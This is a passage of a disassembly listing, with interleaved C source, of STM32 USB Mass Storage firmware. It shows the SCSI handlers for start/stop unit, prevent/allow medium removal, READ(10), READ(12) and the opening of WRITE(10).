 800a332:	3304      	adds	r3, #4
 800a334:	781b      	ldrb	r3, [r3, #0]
 800a336:	f003 0303 	and.w	r3, r3, #3
 800a33a:	2b02      	cmp	r3, #2
 800a33c:	d106      	bne.n	800a34c <SCSI_StartStopUnit+0x90>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_EJECTED;
 800a33e:	697b      	ldr	r3, [r7, #20]
 800a340:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a344:	2202      	movs	r2, #2
 800a346:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a34a:	e00c      	b.n	800a366 <SCSI_StartStopUnit+0xaa>
  }
  else if ((params[4] & 0x3U) == 0x3U) /* START=1 and LOEJ Load Eject=1 */
 800a34c:	687b      	ldr	r3, [r7, #4]
 800a34e:	3304      	adds	r3, #4
 800a350:	781b      	ldrb	r3, [r3, #0]
 800a352:	f003 0303 	and.w	r3, r3, #3
 800a356:	2b03      	cmp	r3, #3
 800a358:	d105      	bne.n	800a366 <SCSI_StartStopUnit+0xaa>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a35a:	697b      	ldr	r3, [r7, #20]
 800a35c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a360:	2200      	movs	r2, #0
 800a362:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }
  else
  {
    /* .. */
  }
  hmsc->bot_data_length = 0U;
 800a366:	697b      	ldr	r3, [r7, #20]
 800a368:	2200      	movs	r2, #0
 800a36a:	60da      	str	r2, [r3, #12]

  return 0;
 800a36c:	2300      	movs	r3, #0
}
 800a36e:	4618      	mov	r0, r3
 800a370:	3718      	adds	r7, #24
 800a372:	46bd      	mov	sp, r7
 800a374:	bd80      	pop	{r7, pc}

0800a376 <SCSI_AllowPreventRemovable>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_AllowPreventRemovable(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a376:	b480      	push	{r7}
 800a378:	b087      	sub	sp, #28
 800a37a:	af00      	add	r7, sp, #0
 800a37c:	60f8      	str	r0, [r7, #12]
 800a37e:	460b      	mov	r3, r1
 800a380:	607a      	str	r2, [r7, #4]
 800a382:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a384:	68fb      	ldr	r3, [r7, #12]
 800a386:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a38a:	68fb      	ldr	r3, [r7, #12]
 800a38c:	32b0      	adds	r2, #176	; 0xb0
 800a38e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a392:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a394:	697b      	ldr	r3, [r7, #20]
 800a396:	2b00      	cmp	r3, #0
 800a398:	d102      	bne.n	800a3a0 <SCSI_AllowPreventRemovable+0x2a>
  {
    return -1;
 800a39a:	f04f 33ff 	mov.w	r3, #4294967295
 800a39e:	e015      	b.n	800a3cc <SCSI_AllowPreventRemovable+0x56>
  }

  if (params[4] == 0U)
 800a3a0:	687b      	ldr	r3, [r7, #4]
 800a3a2:	3304      	adds	r3, #4
 800a3a4:	781b      	ldrb	r3, [r3, #0]
 800a3a6:	2b00      	cmp	r3, #0
 800a3a8:	d106      	bne.n	800a3b8 <SCSI_AllowPreventRemovable+0x42>
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 800a3aa:	697b      	ldr	r3, [r7, #20]
 800a3ac:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3b0:	2200      	movs	r2, #0
 800a3b2:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
 800a3b6:	e005      	b.n	800a3c4 <SCSI_AllowPreventRemovable+0x4e>
  }
  else
  {
    hmsc->scsi_medium_state = SCSI_MEDIUM_LOCKED;
 800a3b8:	697b      	ldr	r3, [r7, #20]
 800a3ba:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a3be:	2201      	movs	r2, #1
 800a3c0:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62
  }

  hmsc->bot_data_length = 0U;
 800a3c4:	697b      	ldr	r3, [r7, #20]
 800a3c6:	2200      	movs	r2, #0
 800a3c8:	60da      	str	r2, [r3, #12]

  return 0;
 800a3ca:	2300      	movs	r3, #0
}
 800a3cc:	4618      	mov	r0, r3
 800a3ce:	371c      	adds	r7, #28
 800a3d0:	46bd      	mov	sp, r7
 800a3d2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800a3d6:	4770      	bx	lr

0800a3d8 <SCSI_Read10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a3d8:	b580      	push	{r7, lr}
 800a3da:	b086      	sub	sp, #24
 800a3dc:	af00      	add	r7, sp, #0
 800a3de:	60f8      	str	r0, [r7, #12]
 800a3e0:	460b      	mov	r3, r1
 800a3e2:	607a      	str	r2, [r7, #4]
 800a3e4:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a3e6:	68fb      	ldr	r3, [r7, #12]
 800a3e8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a3ec:	68fb      	ldr	r3, [r7, #12]
 800a3ee:	32b0      	adds	r2, #176	; 0xb0
 800a3f0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a3f4:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a3f6:	697b      	ldr	r3, [r7, #20]
 800a3f8:	2b00      	cmp	r3, #0
 800a3fa:	d102      	bne.n	800a402 <SCSI_Read10+0x2a>
  {
    return -1;
 800a3fc:	f04f 33ff 	mov.w	r3, #4294967295
 800a400:	e09d      	b.n	800a53e <SCSI_Read10+0x166>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a402:	697b      	ldr	r3, [r7, #20]
 800a404:	7a1b      	ldrb	r3, [r3, #8]
 800a406:	2b00      	cmp	r3, #0
 800a408:	f040 808f 	bne.w	800a52a <SCSI_Read10+0x152>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a40c:	697b      	ldr	r3, [r7, #20]
 800a40e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a412:	7f1b      	ldrb	r3, [r3, #28]
 800a414:	b25b      	sxtb	r3, r3
 800a416:	2b00      	cmp	r3, #0
 800a418:	db0b      	blt.n	800a432 <SCSI_Read10+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a41a:	697b      	ldr	r3, [r7, #20]
 800a41c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a420:	7f59      	ldrb	r1, [r3, #29]
 800a422:	2320      	movs	r3, #32
 800a424:	2205      	movs	r2, #5
 800a426:	68f8      	ldr	r0, [r7, #12]
 800a428:	f7ff feec 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a42c:	f04f 33ff 	mov.w	r3, #4294967295
 800a430:	e085      	b.n	800a53e <SCSI_Read10+0x166>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a432:	697b      	ldr	r3, [r7, #20]
 800a434:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a438:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a43c:	2b02      	cmp	r3, #2
 800a43e:	d108      	bne.n	800a452 <SCSI_Read10+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a440:	7af9      	ldrb	r1, [r7, #11]
 800a442:	233a      	movs	r3, #58	; 0x3a
 800a444:	2202      	movs	r2, #2
 800a446:	68f8      	ldr	r0, [r7, #12]
 800a448:	f7ff fedc 	bl	800a204 <SCSI_SenseCode>

      return -1;
 800a44c:	f04f 33ff 	mov.w	r3, #4294967295
 800a450:	e075      	b.n	800a53e <SCSI_Read10+0x166>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a452:	68fb      	ldr	r3, [r7, #12]
 800a454:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a458:	68fa      	ldr	r2, [r7, #12]
 800a45a:	33b0      	adds	r3, #176	; 0xb0
 800a45c:	009b      	lsls	r3, r3, #2
 800a45e:	4413      	add	r3, r2
 800a460:	685b      	ldr	r3, [r3, #4]
 800a462:	689b      	ldr	r3, [r3, #8]
 800a464:	7afa      	ldrb	r2, [r7, #11]
 800a466:	4610      	mov	r0, r2
 800a468:	4798      	blx	r3
 800a46a:	4603      	mov	r3, r0
 800a46c:	2b00      	cmp	r3, #0
 800a46e:	d008      	beq.n	800a482 <SCSI_Read10+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a470:	7af9      	ldrb	r1, [r7, #11]
 800a472:	233a      	movs	r3, #58	; 0x3a
 800a474:	2202      	movs	r2, #2
 800a476:	68f8      	ldr	r0, [r7, #12]
 800a478:	f7ff fec4 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a47c:	f04f 33ff 	mov.w	r3, #4294967295
 800a480:	e05d      	b.n	800a53e <SCSI_Read10+0x166>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a482:	687b      	ldr	r3, [r7, #4]
 800a484:	3302      	adds	r3, #2
 800a486:	781b      	ldrb	r3, [r3, #0]
 800a488:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a48a:	687b      	ldr	r3, [r7, #4]
 800a48c:	3303      	adds	r3, #3
 800a48e:	781b      	ldrb	r3, [r3, #0]
 800a490:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a492:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a494:	687b      	ldr	r3, [r7, #4]
 800a496:	3304      	adds	r3, #4
 800a498:	781b      	ldrb	r3, [r3, #0]
 800a49a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a49c:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a49e:	687a      	ldr	r2, [r7, #4]
 800a4a0:	3205      	adds	r2, #5
 800a4a2:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a4a4:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a4a6:	697a      	ldr	r2, [r7, #20]
 800a4a8:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4ac:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[7] <<  8) | (uint32_t)params[8];
 800a4ae:	687b      	ldr	r3, [r7, #4]
 800a4b0:	3307      	adds	r3, #7
 800a4b2:	781b      	ldrb	r3, [r3, #0]
 800a4b4:	021b      	lsls	r3, r3, #8
 800a4b6:	687a      	ldr	r2, [r7, #4]
 800a4b8:	3208      	adds	r2, #8
 800a4ba:	7812      	ldrb	r2, [r2, #0]
 800a4bc:	4313      	orrs	r3, r2
 800a4be:	697a      	ldr	r2, [r7, #20]
 800a4c0:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a4c4:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a4c6:	697b      	ldr	r3, [r7, #20]
 800a4c8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4cc:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a4ce:	697b      	ldr	r3, [r7, #20]
 800a4d0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4d4:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a4d6:	7af9      	ldrb	r1, [r7, #11]
 800a4d8:	68f8      	ldr	r0, [r7, #12]
 800a4da:	f000 fb0c 	bl	800aaf6 <SCSI_CheckAddressRange>
 800a4de:	4603      	mov	r3, r0
 800a4e0:	2b00      	cmp	r3, #0
 800a4e2:	da02      	bge.n	800a4ea <SCSI_Read10+0x112>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a4e4:	f04f 33ff 	mov.w	r3, #4294967295
 800a4e8:	e029      	b.n	800a53e <SCSI_Read10+0x166>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a4ea:	697b      	ldr	r3, [r7, #20]
 800a4ec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4f0:	699a      	ldr	r2, [r3, #24]
 800a4f2:	697b      	ldr	r3, [r7, #20]
 800a4f4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a4f8:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a4fa:	6979      	ldr	r1, [r7, #20]
 800a4fc:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a500:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a504:	fb01 f303 	mul.w	r3, r1, r3
 800a508:	429a      	cmp	r2, r3
 800a50a:	d00b      	beq.n	800a524 <SCSI_Read10+0x14c>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a50c:	697b      	ldr	r3, [r7, #20]
 800a50e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a512:	7f59      	ldrb	r1, [r3, #29]
 800a514:	2320      	movs	r3, #32
 800a516:	2205      	movs	r2, #5
 800a518:	68f8      	ldr	r0, [r7, #12]
 800a51a:	f7ff fe73 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a51e:	f04f 33ff 	mov.w	r3, #4294967295
 800a522:	e00c      	b.n	800a53e <SCSI_Read10+0x166>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a524:	697b      	ldr	r3, [r7, #20]
 800a526:	2202      	movs	r2, #2
 800a528:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a52a:	697b      	ldr	r3, [r7, #20]
 800a52c:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a530:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a532:	7afb      	ldrb	r3, [r7, #11]
 800a534:	4619      	mov	r1, r3
 800a536:	68f8      	ldr	r0, [r7, #12]
 800a538:	f000 fb0a 	bl	800ab50 <SCSI_ProcessRead>
 800a53c:	4603      	mov	r3, r0
}
 800a53e:	4618      	mov	r0, r3
 800a540:	3718      	adds	r7, #24
 800a542:	46bd      	mov	sp, r7
 800a544:	bd80      	pop	{r7, pc}

0800a546 <SCSI_Read12>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Read12(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a546:	b580      	push	{r7, lr}
 800a548:	b086      	sub	sp, #24
 800a54a:	af00      	add	r7, sp, #0
 800a54c:	60f8      	str	r0, [r7, #12]
 800a54e:	460b      	mov	r3, r1
 800a550:	607a      	str	r2, [r7, #4]
 800a552:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a554:	68fb      	ldr	r3, [r7, #12]
 800a556:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a55a:	68fb      	ldr	r3, [r7, #12]
 800a55c:	32b0      	adds	r2, #176	; 0xb0
 800a55e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a562:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 800a564:	697b      	ldr	r3, [r7, #20]
 800a566:	2b00      	cmp	r3, #0
 800a568:	d102      	bne.n	800a570 <SCSI_Read12+0x2a>
  {
    return -1;
 800a56a:	f04f 33ff 	mov.w	r3, #4294967295
 800a56e:	e0a7      	b.n	800a6c0 <SCSI_Read12+0x17a>
  }

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a570:	697b      	ldr	r3, [r7, #20]
 800a572:	7a1b      	ldrb	r3, [r3, #8]
 800a574:	2b00      	cmp	r3, #0
 800a576:	f040 8099 	bne.w	800a6ac <SCSI_Read12+0x166>
  {
    /* case 10 : Ho <> Di */
    if ((hmsc->cbw.bmFlags & 0x80U) != 0x80U)
 800a57a:	697b      	ldr	r3, [r7, #20]
 800a57c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a580:	7f1b      	ldrb	r3, [r3, #28]
 800a582:	b25b      	sxtb	r3, r3
 800a584:	2b00      	cmp	r3, #0
 800a586:	db0b      	blt.n	800a5a0 <SCSI_Read12+0x5a>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a588:	697b      	ldr	r3, [r7, #20]
 800a58a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a58e:	7f59      	ldrb	r1, [r3, #29]
 800a590:	2320      	movs	r3, #32
 800a592:	2205      	movs	r2, #5
 800a594:	68f8      	ldr	r0, [r7, #12]
 800a596:	f7ff fe35 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a59a:	f04f 33ff 	mov.w	r3, #4294967295
 800a59e:	e08f      	b.n	800a6c0 <SCSI_Read12+0x17a>
    }

    if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 800a5a0:	697b      	ldr	r3, [r7, #20]
 800a5a2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a5a6:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a5aa:	2b02      	cmp	r3, #2
 800a5ac:	d108      	bne.n	800a5c0 <SCSI_Read12+0x7a>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5ae:	7af9      	ldrb	r1, [r7, #11]
 800a5b0:	233a      	movs	r3, #58	; 0x3a
 800a5b2:	2202      	movs	r2, #2
 800a5b4:	68f8      	ldr	r0, [r7, #12]
 800a5b6:	f7ff fe25 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a5ba:	f04f 33ff 	mov.w	r3, #4294967295
 800a5be:	e07f      	b.n	800a6c0 <SCSI_Read12+0x17a>
    }

    if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 800a5c0:	68fb      	ldr	r3, [r7, #12]
 800a5c2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a5c6:	68fa      	ldr	r2, [r7, #12]
 800a5c8:	33b0      	adds	r3, #176	; 0xb0
 800a5ca:	009b      	lsls	r3, r3, #2
 800a5cc:	4413      	add	r3, r2
 800a5ce:	685b      	ldr	r3, [r3, #4]
 800a5d0:	689b      	ldr	r3, [r3, #8]
 800a5d2:	7afa      	ldrb	r2, [r7, #11]
 800a5d4:	4610      	mov	r0, r2
 800a5d6:	4798      	blx	r3
 800a5d8:	4603      	mov	r3, r0
 800a5da:	2b00      	cmp	r3, #0
 800a5dc:	d008      	beq.n	800a5f0 <SCSI_Read12+0xaa>
    {
      SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a5de:	7af9      	ldrb	r1, [r7, #11]
 800a5e0:	233a      	movs	r3, #58	; 0x3a
 800a5e2:	2202      	movs	r2, #2
 800a5e4:	68f8      	ldr	r0, [r7, #12]
 800a5e6:	f7ff fe0d 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a5ea:	f04f 33ff 	mov.w	r3, #4294967295
 800a5ee:	e067      	b.n	800a6c0 <SCSI_Read12+0x17a>
    }

    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a5f0:	687b      	ldr	r3, [r7, #4]
 800a5f2:	3302      	adds	r3, #2
 800a5f4:	781b      	ldrb	r3, [r3, #0]
 800a5f6:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[3] << 16) |
 800a5f8:	687b      	ldr	r3, [r7, #4]
 800a5fa:	3303      	adds	r3, #3
 800a5fc:	781b      	ldrb	r3, [r3, #0]
 800a5fe:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a600:	431a      	orrs	r2, r3
                          ((uint32_t)params[4] <<  8) |
 800a602:	687b      	ldr	r3, [r7, #4]
 800a604:	3304      	adds	r3, #4
 800a606:	781b      	ldrb	r3, [r3, #0]
 800a608:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[3] << 16) |
 800a60a:	4313      	orrs	r3, r2
                          (uint32_t)params[5];
 800a60c:	687a      	ldr	r2, [r7, #4]
 800a60e:	3205      	adds	r2, #5
 800a610:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[4] <<  8) |
 800a612:	4313      	orrs	r3, r2
    hmsc->scsi_blk_addr = ((uint32_t)params[2] << 24) |
 800a614:	697a      	ldr	r2, [r7, #20]
 800a616:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a61a:	66d3      	str	r3, [r2, #108]	; 0x6c

    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a61c:	687b      	ldr	r3, [r7, #4]
 800a61e:	3306      	adds	r3, #6
 800a620:	781b      	ldrb	r3, [r3, #0]
 800a622:	061a      	lsls	r2, r3, #24
                         ((uint32_t)params[7] << 16) |
 800a624:	687b      	ldr	r3, [r7, #4]
 800a626:	3307      	adds	r3, #7
 800a628:	781b      	ldrb	r3, [r3, #0]
 800a62a:	041b      	lsls	r3, r3, #16
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a62c:	431a      	orrs	r2, r3
                         ((uint32_t)params[8] << 8) |
 800a62e:	687b      	ldr	r3, [r7, #4]
 800a630:	3308      	adds	r3, #8
 800a632:	781b      	ldrb	r3, [r3, #0]
 800a634:	021b      	lsls	r3, r3, #8
                         ((uint32_t)params[7] << 16) |
 800a636:	4313      	orrs	r3, r2
                         (uint32_t)params[9];
 800a638:	687a      	ldr	r2, [r7, #4]
 800a63a:	3209      	adds	r2, #9
 800a63c:	7812      	ldrb	r2, [r2, #0]
                         ((uint32_t)params[8] << 8) |
 800a63e:	4313      	orrs	r3, r2
    hmsc->scsi_blk_len = ((uint32_t)params[6] << 24) |
 800a640:	697a      	ldr	r2, [r7, #20]
 800a642:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800a646:	6713      	str	r3, [r2, #112]	; 0x70

    if (SCSI_CheckAddressRange(pdev, lun, hmsc->scsi_blk_addr,
 800a648:	697b      	ldr	r3, [r7, #20]
 800a64a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a64e:	6eda      	ldr	r2, [r3, #108]	; 0x6c
 800a650:	697b      	ldr	r3, [r7, #20]
 800a652:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a656:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a658:	7af9      	ldrb	r1, [r7, #11]
 800a65a:	68f8      	ldr	r0, [r7, #12]
 800a65c:	f000 fa4b 	bl	800aaf6 <SCSI_CheckAddressRange>
 800a660:	4603      	mov	r3, r0
 800a662:	2b00      	cmp	r3, #0
 800a664:	da02      	bge.n	800a66c <SCSI_Read12+0x126>
                               hmsc->scsi_blk_len) < 0)
    {
      return -1; /* error */
 800a666:	f04f 33ff 	mov.w	r3, #4294967295
 800a66a:	e029      	b.n	800a6c0 <SCSI_Read12+0x17a>
    }

    /* cases 4,5 : Hi <> Dn */
    if (hmsc->cbw.dDataLength != (hmsc->scsi_blk_len * hmsc->scsi_blk_size))
 800a66c:	697b      	ldr	r3, [r7, #20]
 800a66e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a672:	699a      	ldr	r2, [r3, #24]
 800a674:	697b      	ldr	r3, [r7, #20]
 800a676:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a67a:	6f1b      	ldr	r3, [r3, #112]	; 0x70
 800a67c:	6979      	ldr	r1, [r7, #20]
 800a67e:	f501 5180 	add.w	r1, r1, #4096	; 0x1000
 800a682:	f8b1 1064 	ldrh.w	r1, [r1, #100]	; 0x64
 800a686:	fb01 f303 	mul.w	r3, r1, r3
 800a68a:	429a      	cmp	r2, r3
 800a68c:	d00b      	beq.n	800a6a6 <SCSI_Read12+0x160>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a68e:	697b      	ldr	r3, [r7, #20]
 800a690:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a694:	7f59      	ldrb	r1, [r3, #29]
 800a696:	2320      	movs	r3, #32
 800a698:	2205      	movs	r2, #5
 800a69a:	68f8      	ldr	r0, [r7, #12]
 800a69c:	f7ff fdb2 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a6a0:	f04f 33ff 	mov.w	r3, #4294967295
 800a6a4:	e00c      	b.n	800a6c0 <SCSI_Read12+0x17a>
    }

    hmsc->bot_state = USBD_BOT_DATA_IN;
 800a6a6:	697b      	ldr	r3, [r7, #20]
 800a6a8:	2202      	movs	r2, #2
 800a6aa:	721a      	strb	r2, [r3, #8]
  }
  hmsc->bot_data_length = MSC_MEDIA_PACKET;
 800a6ac:	697b      	ldr	r3, [r7, #20]
 800a6ae:	f44f 5280 	mov.w	r2, #4096	; 0x1000
 800a6b2:	60da      	str	r2, [r3, #12]

  return SCSI_ProcessRead(pdev, lun);
 800a6b4:	7afb      	ldrb	r3, [r7, #11]
 800a6b6:	4619      	mov	r1, r3
 800a6b8:	68f8      	ldr	r0, [r7, #12]
 800a6ba:	f000 fa49 	bl	800ab50 <SCSI_ProcessRead>
 800a6be:	4603      	mov	r3, r0
}
 800a6c0:	4618      	mov	r0, r3
 800a6c2:	3718      	adds	r7, #24
 800a6c4:	46bd      	mov	sp, r7
 800a6c6:	bd80      	pop	{r7, pc}

0800a6c8 <SCSI_Write10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Write10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a6c8:	b580      	push	{r7, lr}
 800a6ca:	b086      	sub	sp, #24
 800a6cc:	af00      	add	r7, sp, #0
 800a6ce:	60f8      	str	r0, [r7, #12]
 800a6d0:	460b      	mov	r3, r1
 800a6d2:	607a      	str	r2, [r7, #4]
 800a6d4:	72fb      	strb	r3, [r7, #11]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a6d6:	68fb      	ldr	r3, [r7, #12]
 800a6d8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a6dc:	68fb      	ldr	r3, [r7, #12]
 800a6de:	32b0      	adds	r2, #176	; 0xb0
 800a6e0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a6e4:	617b      	str	r3, [r7, #20]
  uint32_t len;

  if (hmsc == NULL)
 800a6e6:	697b      	ldr	r3, [r7, #20]
 800a6e8:	2b00      	cmp	r3, #0
 800a6ea:	d102      	bne.n	800a6f2 <SCSI_Write10+0x2a>
  {
    return -1;
 800a6ec:	f04f 33ff 	mov.w	r3, #4294967295
 800a6f0:	e0c7      	b.n	800a882 <SCSI_Write10+0x1ba>
#ifdef USE_USBD_COMPOSITE
  /* Get the Endpoints addresses allocated for this class instance */
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc->bot_state == USBD_BOT_IDLE) /* Idle */
 800a6f2:	697b      	ldr	r3, [r7, #20]
 800a6f4:	7a1b      	ldrb	r3, [r3, #8]
 800a6f6:	2b00      	cmp	r3, #0
 800a6f8:	f040 80bd 	bne.w	800a876 <SCSI_Write10+0x1ae>
  {
    if (hmsc->cbw.dDataLength == 0U)
 800a6fc:	697b      	ldr	r3, [r7, #20]
 800a6fe:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a702:	699b      	ldr	r3, [r3, #24]
 800a704:	2b00      	cmp	r3, #0
 800a706:	d10b      	bne.n	800a720 <SCSI_Write10+0x58>
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a708:	697b      	ldr	r3, [r7, #20]
 800a70a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a70e:	7f59      	ldrb	r1, [r3, #29]
 800a710:	2320      	movs	r3, #32
 800a712:	2205      	movs	r2, #5
 800a714:	68f8      	ldr	r0, [r7, #12]
 800a716:	f7ff fd75 	bl	800a204 <SCSI_SenseCode>
      return -1;
 800a71a:	f04f 33ff 	mov.w	r3, #4294967295
 800a71e:	e0b0      	b.n	800a882 <SCSI_Write10+0x1ba>
    }

    /* case 8 : Hi <> Do */
    if ((hmsc->cbw.bmFlags & 0x80U) == 0x80U)
 800a720:	697b      	ldr	r3, [r7, #20]
 800a722:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a726:	7f1b      	ldrb	r3, [r3, #28]
 800a728:	b25b      	sxtb	r3, r3
